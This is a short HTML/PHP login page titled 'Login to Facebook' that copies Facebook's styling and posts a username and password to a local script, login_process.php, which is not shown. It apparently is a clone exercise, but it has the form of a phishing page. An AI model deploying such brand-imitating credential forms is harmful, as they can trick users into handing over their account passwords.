<!DOCTYPE html>
<html>
<head>
	<title>Login to Facebook</title>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
	<style>
		body {
			background-color: #f0f2f5;
		}
		.container {
			background-color: #fff;
			border-radius: 5px;
			box-shadow: 0 2px 4px rgba(0,0,0,.2);
			padding: 40px;
			margin-top: 40px;
			max-width: 500px;
		}
		h1 {
			font-size: 36px;
			font-weight: bold;
			margin-bottom: 20px;
			text-align: center;
			color: #1877f2;
		}
		label {
			font-size: 14px;
			font-weight: bold;
			color: #9a9a9a;
		}
		input[type="text"], input[type="password"] {
			border: 1px solid #dddfe2;
			border-radius: 5px;
			padding: 10px;
			margin-bottom: 20px;
			width: 100%;
		}
		input[type="submit"] {
			background-color: #1877f2;
			border: none;
			border-radius: 5px;
			color: #fff;
			cursor: pointer;
			font-size: 16px;
			font-weight: bold;
			padding: 10px;
			text-transform: uppercase;
			width: 100%;
		}
		input[type="submit"]:hover {
			background-color: #166fe5;
		}
		.register-link {
			color: #1877f2;
			cursor: pointer;
			display: inline-block;
			font-size: 14px;
			margin-top: 10px;
			text-align: center;
			width: 100%;
		}
		.register-link:hover {
			text-decoration: underline;
		}
	</style>
</head>
<body>
	<div class="container">
		<h1>Login to Facebook</h1>
		<form method="post" action="login_process.php">
			<label>Email or Phone:</label>
			<input type="text" name="username">
			<label>Password:</label>
			<input type="password" name="password">
			<input type="submit" value="Log In">
		
		</form>
		<div class="register-link"><a href="register.php">Create New Account</a></div>
	</div><br><br>
    <div>
     <?php 
     include_once("top3.php");
     ?>
    </div>   
</body>
</html>

